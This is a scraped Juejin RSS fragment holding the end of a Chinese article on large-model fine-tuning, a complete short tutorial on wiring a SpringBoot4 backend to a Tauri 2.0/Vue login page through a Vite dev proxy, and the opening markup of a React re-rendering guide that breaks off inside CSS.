<table><thead><tr><th/><th/><th/><th/></tr></thead><tbody><tr><td/><td><strong>金融分析</strong></td><td><strong>医疗诊断</strong></td><td><strong>代码生成</strong></td></tr><tr><td>金融分析</td><td>1.00</td><td>0.87</td><td>0.32</td></tr><tr><td>医疗诊断</td><td>-</td><td>1.00</td><td>0.41</td></tr><tr><td>代码生成</td><td>-</td><td>-</td><td>1.00</td></tr><tr><td><em>注：数值&gt;0.6需启动知识保护机制</em></td><td/><td/><td/></tr></tbody></table>
<hr/>
<h2 data-id="heading-12">四、2025技术前瞻</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53311cc02aa640c4bab057fd0ad2dad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854260&amp;x-signature=1gyVOahGjNH2HqGWhnVAzEp2WIo%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>硬件感知微调</strong> NVIDIA H200 GPU通过<strong>异步计算单元</strong>实现梯度计算与传输并行，通信开销降低40%</li>
<li><strong>Δ参数动态路由</strong> 根据输入数据特性动态选择微调路径：</li>
</ol>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span><span class="hljs-string">"医学报告"</span> <span class="hljs-keyword">in</span> input_text:
activate_medical_adapter() <span class="hljs-comment"># 启用医疗微调路径</span>
</code></pre>
<p><strong>神经符号混合调优</strong> 结合符号规则约束输出空间，解决法律/金融领域严格约束问题</p>
<hr/>
<h2 data-id="heading-13">结语</h2>
<p>“<strong>模型调优不是简单的参数扰动，而是在高维空间构建知识立交桥</strong>”——2024年NeurIPS主旨报告。随着稀疏化技术、硬件协同设计的突破，万亿模型在消费级设备的轻量化调优正在成为现实。未来重点将是实现：<strong>更低资源消耗、更少遗忘风险、更高领域适应性</strong>的三角平衡。</p>
<h3 data-id="heading-14">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day 22：SpringBoot4 + Tauri 2.0（VUE） 登录功能前后端联调]]></title>    <link>https://juejin.cn/post/7581381365494038582</link>    <guid>https://juejin.cn/post/7581381365494038582</guid>    <pubDate>2025-12-09T03:14:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581381365494038582" data-draft-id="7581333926373392426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day 22：SpringBoot4 + Tauri 2.0（VUE） 登录功能前后端联调"/> <meta itemprop="keywords" content="前端,后端,程序员"/> <meta itemprop="datePublished" content="2025-12-09T03:14:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="申阳"/> <meta itemprop="url" content="https://juejin.cn/user/4353721775165486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day 22：SpringBoot4 + Tauri 2.0（VUE） 登录功能前后端联调
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721775165486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    申阳
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:14:19.000Z" title="Tue Dec 09 2025 03:14:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5d734b6ce694aa39de0c996fa9e638e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854859&amp;x-signature=KtKI%2BdxQOAWoqsfmKluLPO3Em4k%3D" alt="image-20251209105825811.png" loading="lazy"/></p>
<h2 data-id="heading-0">一、前言</h2>
<p>我开始意识到这个专栏有点偏离主题了，起初本意是向大家展示和分享我在实践“个人公司”过程中积攒的经验，但是慢慢的又变成了纯技术讲解，我总是想要尽可能的将每一步的细节写清楚，导致我的文章变得又和之前一样，大段的实现细节，大段的示例代码，这已经背离了我这个专栏的初衷，以至于我在前期基础功能准备的时候，花了大量时间来做这个事情，所以我决定，登录功能前后端联调结束后，加快节奏，不再像现在这样写技术实现，而是将重点放在，架构设计、实现思路、落地方法上。</p>
<h2 data-id="heading-1">二、联调 （前端）</h2>
<h3 data-id="heading-2">2.1. 先创建 .env.development 文件</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开发环境配置</span>
<span class="hljs-comment"># 后端服务基础 URL</span>
VITE_APP_BASE_API = <span class="hljs-string">'/dev-api'</span>

<span class="hljs-comment"># 其他环境变量可以在这里添加</span>
</code></pre>
<h3 data-id="heading-3">2.2. 配置代理（解决跨域问题）</h3>
<p>修改 <code>vite.config.ts</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">server</span>: {
    ...
    <span class="hljs-comment">// 添加代理配置</span>
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-string">'/dev-api'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://localhost:8080'</span>, <span class="hljs-comment">// 后端服务地址</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-comment">// rewrite: (path) =&gt; path.replace(/^\/api/, '') // 如果需要重写路径</span>
      }
    }
  },
</code></pre>
<h3 data-id="heading-4">2.3. 定义类型</h3>
<pre><code class="hljs language-bash" lang="bash">src/
└── types/              <span class="hljs-comment"># 集中管理所有自定义类型</span>
    ├── index.ts        <span class="hljs-comment"># 类型导出入口</span>
    ├── api.ts          <span class="hljs-comment"># API相关类型（请求/响应）</span>
    ├── user.ts         <span class="hljs-comment"># 用户相关类型</span>
    └── common.ts       <span class="hljs-comment"># 通用类型（如分页、通用响应等）</span>
</code></pre>
<h3 data-id="heading-5">2.4. 定义接口</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// api/login.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">LoginDTO</span>, <span class="hljs-title class_">LoginVO</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../types'</span>
<span class="hljs-keyword">import</span> http <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/request'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> loginApi = {
    <span class="hljs-comment">// 登录</span>
     <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">data: LoginDTO</span>) =&gt;</span> http.<span class="hljs-property">post</span>&lt;<span class="hljs-title class_">LoginVO</span>&gt;(<span class="hljs-string">'/auth/login'</span>, data),

}
</code></pre>
<h3 data-id="heading-6">2.5. 测试</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11f6e3cb5c14486caaecc27dea26fad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sz6Ziz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854859&amp;x-signature=lcU891imejbtwCd9EbntPKWAx0U%3D" alt="image-20251209105825811" loading="lazy"/></p>
<h2 data-id="heading-7">三、联调（后端）</h2>
<p>后端其实没什么需要处理的了，提供好接口就行。</p>
<h2 data-id="heading-8">四、总结</h2>
<p>在前面这些地方耽误了挺多时间的，需要加快一下脚步了，我的主题是每天2小时，但是我发现，我在整理文章的过程中为了尽可能的展示步骤，导致我有点本末倒置了，以后文章只表达思路，具体实现大家看源码吧，有问题再讨论。</p>
<p><strong>千里之行，始于足下。你的“个人公司”从这第一个2小时开始。欢迎在评论区分享你的进展或遇到的卡点，我会逐一查看，尽可能的帮助解决。我们下一篇文章见！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 避坑指南：彻底搞定不必要的重新渲染]]></title>    <link>https://juejin.cn/post/7581412607061131310</link>    <guid>https://juejin.cn/post/7581412607061131310</guid>    <pubDate>2025-12-09T03:16:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607061131310" data-draft-id="7581457966965981194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 避坑指南：彻底搞定不必要的重新渲染"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-12-09T03:16:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="404星球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/193147068224126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 避坑指南：彻底搞定不必要的重新渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/193147068224126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    404星球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:16:56.000Z" title="Tue Dec 09 2025 03:16:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 